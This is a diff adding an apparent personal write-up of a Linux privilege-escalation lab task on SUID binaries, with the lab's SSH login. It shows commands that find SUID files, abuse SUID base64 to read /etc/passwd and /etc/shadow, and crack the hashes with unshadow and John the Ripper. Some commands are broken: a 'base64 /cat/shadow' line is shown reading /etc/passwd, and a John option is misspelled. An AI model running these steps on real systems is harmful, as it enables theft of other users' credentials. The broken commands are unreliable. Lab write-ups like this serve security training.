@@ -1,0 +1,48 @@
+TASK_7
+Linux Privilege Escalation > Task 7 "SUID"
+
+______ssh creds______
+|Username: karen    |
+|Password: Password1|
+---------------------
+
+
+Another privilege control vector that relies on controlling the users and files interactions. As we already know, files can have read (r), write (w) and execute (x) permissions that are given to users setting SUID (Set-User IDentification) and SGID (Set-Group IDentification).
+
+By hitting the following command we can list the files that have their SUID or and SGID set. You will notice that all of them have an "s" bit set that shows their (s)pecial permission level (its the right time to connect via ssh to the target)
+input   :   find / -type f -perm -04000 -ls 2>/dev/null
+outpt   :   ...
+            1722     44 -rwsr-xr-x   1 root     root               43352 Sep  5  2019 /usr/bin/base64
+            ...
+Tip     :   "2>/dev/null" sends the errors to /dev/null in order not to be printed into the terminal as it can print a vast amount of those!
+
+As you can see many files have special permission level access but only base64 is exploitable with SUID via GTFOBins. For this task we wont try to open a root shell. We will abuse the "r" file permission by encoding and decoding the file in the same command using pipe "|" as "cat" is denied due to current permission level.
+
+The first question is about identifying a user that has the name of a great comic writer so we want to read the /etc/passwd file
+input   :   base64 /cat/shadow | base64 -d
+outpt   :   ...
+            gerryconway:x:1001:1001::/home/gerryconway:/bin/sh
+            ...
+We found him! Its Gerry Conway!
+
+Now for the second question we have to apply a more advanced technique. We want to find the user2's password so maybe we need a password cracking method.
+
+First, we will fetch the content of the above command to save it into a new one on our MACHINA. Second, we will also fetch the content of the /etc/shadow to get the password hashes. And then, we will combine those files to a crackable one by John The Ripper. To achieve this will use the unshadow tool
+input   :   unshadow <PASSWD_FILE>.txt <SHADOW_FILE>.txt > <CRACKABLE_FILE>.txt
+outpt   :   //Blank. Hit "ls -la" and or "cat <CRACKABLE_FILE>.txt"
+
+Now we will summon John The Ripper
+input   :   john --wordlists=/usr/share/wordlists/rockyou.txt <CRACKABLE_FILE>.txt
+outpt   :   ...
+            <KAREN'S_PASSWORD>               (karen)
+            <USER2'S_PASSWORD>               (user2)
+            <GERRYCONWAY'S_PASSWORD>         (gerryconway)
+            ...
+
+Last we have to find the flag! We still wont open any root shell
+input   :   base64 <PATH_TO_FLAG> | base64 -d
+outpt   :   <FLAG>.txt
+
+
+
+made by @gr1m.r3ap3r
